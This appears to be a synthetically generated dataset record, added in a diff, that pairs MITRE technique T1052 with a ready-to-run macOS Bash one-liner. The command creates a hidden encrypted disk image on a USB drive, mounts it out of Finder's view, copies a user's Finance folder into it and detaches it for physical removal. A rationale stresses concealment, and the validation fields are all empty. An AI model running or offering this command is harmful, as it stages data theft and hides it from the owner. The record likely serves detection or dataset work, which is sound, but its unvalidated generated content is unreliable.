@@ -1,0 +1,23 @@
+{
+  "technique_id": "T1052",
+  "platform": "macOS",
+  "shell": "Bash",
+  "command": "printf 's3cr3tP@ss\\n' | hdiutil create -encryption AES-256 -stdinpass -fs HFS+J -volname \".sys_upd\" -size 200m /Volumes/USB/.sys_upd.dmg && printf 's3cr3tP@ss\\n' | hdiutil attach -stdinpass -nobrowse -mountpoint /Volumes/.sys_upd /Volumes/USB/.sys_upd.dmg && cp -pR ~/Documents/Finance /Volumes/.sys_upd/ && hdiutil detach /Volumes/.sys_upd",
+  "explanation": "Creates and stealthily mounts an encrypted DMG on an external USB, copies sensitive files into it, then detaches to stage data for physical removal.",
+  "rationale_steps": [
+    "Generate encrypted container on removable media to conceal contents.",
+    "Mount with -nobrowse to avoid Finder visibility and casual discovery.",
+    "Copy target data locally to the USB image without any network usage.",
+    "Detach the image to finalize exfil payload for physical extraction."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1052-19e64b98-de1e9d37",
+  "source_prompt_hash": "19e64b98",
+  "timestamp_utc": "2025-09-30T05:31:52.812086Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
